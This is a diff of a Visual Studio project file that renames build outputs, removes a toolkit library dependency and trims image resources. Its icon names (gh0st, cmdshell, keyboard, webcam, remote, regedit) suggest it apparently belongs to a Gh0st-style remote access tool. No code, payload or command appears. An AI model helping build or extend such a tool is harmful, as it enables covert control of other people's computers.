@@ -46,13 +46,13 @@
     <OutDir>..\bin\</OutDir>
     <IntDir>.\vs12_Release\</IntDir>
     <LinkIncremental>false</LinkIncremental>
-    <TargetName>U0_2015</TargetName>
+    <TargetName>U0_2015_vs12</TargetName>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
     <OutDir>..\bin\</OutDir>
     <IntDir>.\vs12_Debug\</IntDir>
     <LinkIncremental>true</LinkIncremental>
-    <TargetName>U0_2015</TargetName>
+    <TargetName>U0_2015_vs12d</TargetName>
   </PropertyGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
     <ClCompile>
@@ -62,7 +62,7 @@
       <FunctionLevelLinking>true</FunctionLevelLinking>
       <Optimization>MinSpace</Optimization>
       <SuppressStartupBanner>true</SuppressStartupBanner>
-      <AdditionalIncludeDirectories>../common;../../include/ToolkitPro1501;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <AdditionalIncludeDirectories>../common;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
       <PreprocessorDefinitions>WIN32;NDEBUG;_WINDOWS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <AssemblerListingLocation>.\vs12_Release\</AssemblerListingLocation>
       <BrowseInformation>true</BrowseInformation>
@@ -90,8 +90,8 @@
       <GenerateDebugInformation>false</GenerateDebugInformation>
       <SubSystem>Windows</SubSystem>
       <IgnoreSpecificDefaultLibraries>%(IgnoreSpecificDefaultLibraries)</IgnoreSpecificDefaultLibraries>
-      <OutputFile>../Bin/U0_2015.exe</OutputFile>
-      <AdditionalDependencies>../../lib/ToolkitPro1501vc100.lib;../../lib/G729a.lib;../../lib/UUID.LIB;../../lib/zlib.lib;../../lib/SkinH.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <OutputFile>../Bin/U0_2015_vs12.exe</OutputFile>
+      <AdditionalDependencies>../../lib/G729a.lib;../../lib/UUID.LIB;../../lib/zlib.lib;../../lib/SkinH.lib;%(AdditionalDependencies)</AdditionalDependencies>
       <AdditionalOptions>/SAFESEH:NO %(AdditionalOptions)</AdditionalOptions>
     </Link>
   </ItemDefinitionGroup>
@@ -103,7 +103,7 @@
       <Optimization>Disabled</Optimization>
       <SuppressStartupBanner>true</SuppressStartupBanner>
       <DebugInformationFormat>EditAndContinue</DebugInformationFormat>
-      <AdditionalIncludeDirectories>../common;../../include/ToolkitPro1501;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <AdditionalIncludeDirectories>../common;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
       <PreprocessorDefinitions>WIN32;NDEBUG;_WINDOWS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <AssemblerListingLocation>.\vs12_Debug\</AssemblerListingLocation>
       <BrowseInformation>true</BrowseInformation>
@@ -131,8 +131,8 @@
       <GenerateDebugInformation>true</GenerateDebugInformation>
       <SubSystem>Windows</SubSystem>
       <IgnoreSpecificDefaultLibraries>%(IgnoreSpecificDefaultLibraries)</IgnoreSpecificDefaultLibraries>
-      <OutputFile>../Bin/U0_2015.exe</OutputFile>
-      <AdditionalDependencies>../../lib/ToolkitPro1501vc100.lib;../../lib/G729a.lib;../../lib/UUID.LIB;../../lib/zlib.lib;../../lib/SkinH.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <OutputFile>../Bin/U0_2015_vs12d.exe</OutputFile>
+      <AdditionalDependencies>../../lib/G729a.lib;../../lib/UUID.LIB;../../lib/zlib.lib;../../lib/SkinH.lib;%(AdditionalDependencies)</AdditionalDependencies>
       <AdditionalOptions>/SAFESEH:NO %(AdditionalOptions)</AdditionalOptions>
     </Link>
   </ItemDefinitionGroup>
@@ -259,37 +259,29 @@
   </ItemGroup>
   <ItemGroup>
     <Image Include="res\102.ico" />
-    <Image Include="res\196.bmp" />
     <Image Include="res\202.ico" />
-    <Image Include="res\9428.ico" />
     <Image Include="res\audio.ico" />
     <Image Include="res\Becareful.ico" />
-    <Image Include="res\bitmap3.bmp" />
     <Image Include="res\Bitmap_4.bmp" />
     <Image Include="res\Bitmap_5.bmp" />
     <Image Include="res\cmdshell.ico" />
     <Image Include="res\CS icon.ico" />
-    <Image Include="res\ddd.bmp" />
     <Image Include="res\dword.ico" />
     <Image Include="res\event.ico" />
     <Image Include="res\EventError.ico" />
     <Image Include="res\gh0st.ico" />
     <Image Include="res\ico2\11.ico" />
     <Image Include="res\ico2\22.ico" />
-    <Image Include="res\ico2\9683.ico" />
     <Image Include="res\ico2\用户0.ico" />
     <Image Include="res\ico3\Burn.ico" />
     <Image Include="res\ico3\SmallIcons.png" />
-    <Image Include="res\icon2.ico" />
     <Image Include="res\keyboard.ico" />
-    <Image Include="res\Logo.bmp" />
     <Image Include="res\monitor.ico" />
     <Image Include="res\mytool.bmp" />
     <Image Include="res\n_ip.ico" />
     <Image Include="res\regedit.ico" />
     <Image Include="res\regsz.ico" />
     <Image Include="res\remote.ico" />
-    <Image Include="res\SHIPIN.ico" />
     <Image Include="res\SysInfo\AppWindows.ico" />
     <Image Include="res\SysInfo\Informacion.ico" />
     <Image Include="res\SysInfo\Process.ico" />
@@ -297,24 +289,15 @@
     <Image Include="res\SysInfo\Services.ico" />
     <Image Include="res\syskm.ico" />
     <Image Include="res\system.ico" />
-    <Image Include="res\systray.ico" />
     <Image Include="res\systray1.ico" />
-    <Image Include="res\toolbar.bmp" />
     <Image Include="res\toolbar1.bmp" />
     <Image Include="res\toolbar2.bmp" />
-    <Image Include="res\toolbar3.bmp" />
     <Image Include="res\toolbar4.bmp" />
-    <Image Include="res\ToolbarLarge.bmp" />
-    <Image Include="res\USER.ico" />
     <Image Include="res\webcam.ico" />
     <Image Include="res\w_ip.ico" />
-    <Image Include="res\启动.bmp" />
     <Image Include="res\实用工具.ico" />
     <Image Include="res\文件夹1.ico" />
     <Image Include="res\文件夹2.ico" />
-    <Image Include="res\无视频.ico" />
-    <Image Include="res\有视频.ico" />
-    <Image Include="res\用户.ico" />
   </ItemGroup>
   <ItemGroup>
     <Media Include="res\Login.wav" />
@@ -324,4 +307,9 @@
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
   </ImportGroup>
+  <ProjectExtensions>
+    <VisualStudio>
+      <UserProperties RESOURCE_FILE="DHL_yk.rc" />
+    </VisualStudio>
+  </ProjectExtensions>
 </Project>
